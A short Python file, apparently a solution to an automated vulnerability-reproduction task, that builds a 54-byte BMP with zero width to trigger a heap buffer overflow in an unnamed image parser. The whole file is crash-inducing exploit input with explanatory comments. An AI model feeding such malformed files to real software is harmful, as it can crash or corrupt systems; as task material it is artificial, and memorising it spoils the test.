import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the vulnerability.

        Args:
            src_path: Path to the vulnerable source code tarball

        Returns:
            bytes: The PoC input that should trigger the vulnerability
        """
        # This vulnerability is related to improper handling of images with zero
        # width or height. A common attack vector for this class of bugs is to
        # craft a minimal image file, like a BMP, with one of its dimensions
        # set to zero in the header.
        #
        # When a library parses this header, it might calculate an allocation
        # size for the pixel buffer based on `width * height`. If width is zero,
        # this results in a zero-sized allocation (e.g., `malloc(0)`).
        # `malloc(0)` can return a non-NULL pointer to a minimal-sized chunk.
        # Subsequent processing logic, however, might not expect a zero-width
        # image and could attempt to write pixel data (e.g., padding, a single
        # pixel) into the undersized buffer, causing a heap buffer overflow.
        #
        # We construct a minimal 54-byte BMP file consisting of just the
        # BITMAPFILEHEADER and BITMAPINFOHEADER.

        # BITMAPFILEHEADER (14 bytes)
        file_header = b'BM'                         # Signature
        file_size = 54                              # Total file size (14 + 40)
        file_header += struct.pack('<I', file_size)
        file_header += struct.pack('<H', 0)         # Reserved
        file_header += struct.pack('<H', 0)         # Reserved
        pixel_data_offset = 54                      # Offset to pixel data
        file_header += struct.pack('<I', pixel_data_offset)

        # BITMAPINFOHEADER (40 bytes)
        info_header = b''
        info_header += struct.pack('<I', 40)        # Header size
        
        # --- Vulnerability Trigger ---
        width = 0                                   # Set image width to 0
        info_header += struct.pack('<i', width)
        
        height = 1                                  # A non-zero height
        info_header += struct.pack('<i', height)
        
        info_header += struct.pack('<H', 1)         # Color planes (must be 1)
        info_header += struct.pack('<H', 24)        # Bits per pixel (24-bit RGB)
        info_header += struct.pack('<I', 0)         # Compression (BI_RGB)
        info_header += struct.pack('<I', 0)         # Image size (can be 0 for BI_RGB)
        info_header += struct.pack('<i', 2835)      # Horizontal resolution (72 DPI)
        info_header += struct.pack('<i', 2835)      # Vertical resolution (72 DPI)
        info_header += struct.pack('<I', 0)         # Colors in palette (0 for 24-bit)
        info_header += struct.pack('<I', 0)         # Important colors (0 means all)

        poc = file_header + info_header
        return poc